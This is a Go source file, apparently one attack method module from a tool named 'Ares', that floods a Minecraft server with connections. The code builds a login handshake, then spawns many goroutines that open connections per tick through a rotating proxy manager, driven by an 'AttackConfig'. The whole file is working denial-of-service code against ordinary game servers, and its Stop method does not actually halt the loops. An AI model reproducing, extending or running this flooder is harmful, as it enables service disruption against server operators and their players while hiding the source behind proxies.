package methods

import (
	"Ares/core"
	"Ares/net/minecraft"
	"Ares/net/minecraft/packet"
	"Ares/utils/mcutils"
	"fmt"
	"net"
	"strconv"
	"time"
)

type CPS struct {
	Config          *core.AttackConfig
	isRunning       bool
	handshakePacket packet.Packet
}

func (c *CPS) Start() {
	ip, port, err := net.SplitHostPort(c.Config.Host)
	if err != nil {
		fmt.Println(err)
		return
	}
	iport, err := strconv.Atoi(port)
	if err != nil {
		fmt.Println(err)
		return
	}

	c.handshakePacket = mcutils.GetHandshakePacket(ip, iport, c.Config.Version, mcutils.Login)

	c.isRunning = true

	done := make(chan struct{})

	for i := 0; i < c.Config.Loops; i++ {
		go c.loop(done)
	}
}

func (c *CPS) loop(done chan struct{}) {
	ticker := time.NewTicker(c.Config.Delay)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			for i := 0; i < c.Config.PerDelay; i++ {
				go c.connect()
			}
		case <-done:
			return
		}
	}
}

func (c *CPS) connect() {
	conn, err := minecraft.DialMc(c.Config.Host, c.Config.ProxyManager.GetNext())
	if err != nil {
		return
	}
	defer conn.Close()
}

func (c *CPS) Stop() {
	c.isRunning = false
}
